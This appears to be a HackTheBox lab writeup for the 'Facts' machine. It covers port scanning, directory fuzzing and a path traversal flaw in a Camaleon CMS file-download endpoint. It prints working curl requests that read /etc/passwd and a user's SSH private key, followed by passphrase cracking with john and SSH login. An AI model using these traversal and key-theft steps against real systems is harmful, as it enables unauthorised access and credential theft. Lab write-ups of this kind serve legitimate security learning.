---
title: "Facts"
date: 2026-02-10T17:00:01Z
categories: [HackTheBox, Writeup]
tags: [htb, hackthebox, writeup, pentest, facts]
description: "HackTheBox Facts machine writeup â€” reconnaissance and enumeration walkthrough."
toc: true
comments: true
---

---

## 1. Initial Reconnaissance

The engagement begins with external reconnaissance to identify exposed services. A full TCP port scan is performed to ensure no listening services are missed. Using a high scan rate provides rapid visibility while still maintaining accuracy.

### Full Port Scan

```bash
sudo nmap -p- --min-rate 5000 -T4 10.129.21.166 -oN ports.nmap
```

### Result Summary

```
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
54321/tcp open  unknown
```

From this scan, three key attack surfaces are identified:

- **SSH (22)** - Potential remote shell access if credentials can be obtained  
- **HTTP (80)** - A web application, often the most likely initial entry point  
- **High Port (54321)** - A non-standard service that warrants further inspection  

At this stage, the web service becomes the primary focus due to its accessibility and likelihood of application-level vulnerabilities.

---

## 2. Hostname Resolution

The HTTP service responds differently depending on the hostname provided. This behavior strongly suggests virtual host routing.

To ensure proper application behavior, the target IP is mapped to its corresponding domain locally.

```bash
echo "10.129.21.166 facts.htb" | sudo tee -a /etc/hosts
```

This guarantees that all subsequent web requests are processed under the expected domain context.

---

## 3. Targeted Service Enumeration

With open ports identified, a more detailed service scan is conducted against the discovered services to gather version information and default script results.

```bash
sudo nmap -sC -sV -p 22,80,54321 facts.htb -oN facts.nmap
```

### Key Findings

- **Port 22:** OpenSSH 9.9p1 (Ubuntu)  
- **Port 80:** nginx 1.26.3 hosting a site titled *facts*  
- **Port 54321:** Golang HTTP service identifying itself as **MinIO**  

The MinIO service does not expose sensitive functionality or credentials at this stage, so focus shifts entirely to the web application on port 80.

---

## 4. Web Enumeration (Port 80)

Navigating to `http://facts.htb` reveals a CMS-driven website. Initial inspection shows a login panel with the option to self-register, allowing authenticated access without any prior credentials.

This is a critical observation, as authenticated-only vulnerabilities become immediately reachable.

### Directory Discovery

To uncover hidden administrative or backend routes, directory fuzzing is performed.

```bash
ffuf -u http://facts.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 302
```

### Relevant Results

```
admin       [302]
admin.php   [302]
admin.cgi   [302]
```

Accessing `/admin` redirects to an authentication page. After registering a new account and logging in, a full administrative dashboard becomes accessible, confirming that the CMS grants elevated functionality to any registered user.

---

## 5. Identifying the Vulnerability

Once authenticated, the CMS version is disclosed as **Camaleon CMS 2.9.x**.

During interaction with content and media management features, a file download endpoint is identified:

```
/admin/media/download_private_file
```

This endpoint accepts a `file` parameter and is intended to serve files from a restricted directory. Initial testing reveals that directory traversal sequences (`../`) are not sanitized, strongly indicating a **path traversal / local file inclusion (LFI)** vulnerability.

Because the endpoint is protected, exploitation requires a valid authenticated session.

---

## 6. Confirming Path Traversal (LFI)

To validate arbitrary file read capability, a known system file is requested while preserving traversal sequences.

### Reading `/etc/passwd`

```bash
curl --path-as-is -i -s -H "Host: facts.htb" -H "User-Agent: Mozilla/5.0" -H "Accept: */*" -b "auth_token=REDACTED; _factsapp_session=REDACTED" "http://facts.htb/admin/media/download_private_file?file=../../../../../../etc/passwd"
```

### Output (Excerpt)

```
root:x:0:0:root:/root:/bin/bash
trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
william:x:1001:1001::/home/william:/bin/bash
```

This confirms unrestricted file read access on the host filesystem.

Two real user accounts are identified:

- **trivia**
- **william**

This shifts the attack from web exploitation to credential harvesting.

---

## 7. SSH Key Extraction

With read access to arbitrary files, user SSH keys become high-value targets.

### Extract Triviaâ€™s Private Key

```bash
curl --path-as-is -i -s -b "auth_token=REDACTED; _factsapp_session=REDACTED" "http://facts.htb/admin/media/download_private_file?file=../../../../../../home/trivia/.ssh/id_ed25519"
```

The response contains a valid OpenSSH private key, confirming that the CMS process has sufficient filesystem permissions to expose sensitive user credentials.

### Save and Secure the Key

```bash
nano trivia_id_ed25519
chmod 600 trivia_id_ed25519
```

---

## 8. Cracking the SSH Key Passphrase

The extracted private key is encrypted, requiring passphrase recovery before use.

### Convert Key to John Format

```bash
ssh2john trivia_id_ed25519 > trivia.hash
```

### Crack Using RockYou

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt trivia.hash
```

### Result

```
dragon<REDACTED>
```

This reveals the passphrase protecting the SSH key.

---

## 9. SSH Access as Trivia

Using the decrypted key and recovered passphrase, SSH access is obtained.

```bash
ssh -i trivia_id_ed25519 trivia@10.129.21.166
```

Authentication succeeds, yielding a stable interactive shell as **trivia**.

---

## 10. User Flag

Enumeration reveals that the user flag is owned by **william**, not the current user.

```bash
cat /home/william/user.txt
```

```
8ef0cfbd64be4d9<REDACTED>

```
---

---

<div class="paywall-section">
  <div class="paywall-fade"></div>
  <div class="paywall-cta">
    <div class="paywall-icon">ðŸ”’</div>
    <h3>Premium Content</h3>
    <p>The full exploitation walkthrough, privilege escalation, and flags are available exclusively for members.</p>
    <a href="https://whop.com/andres-411f/" target="_blank" rel="noopener" class="paywall-btn">
      Unlock Full Writeup â†’
    </a>
  </div>
</div>
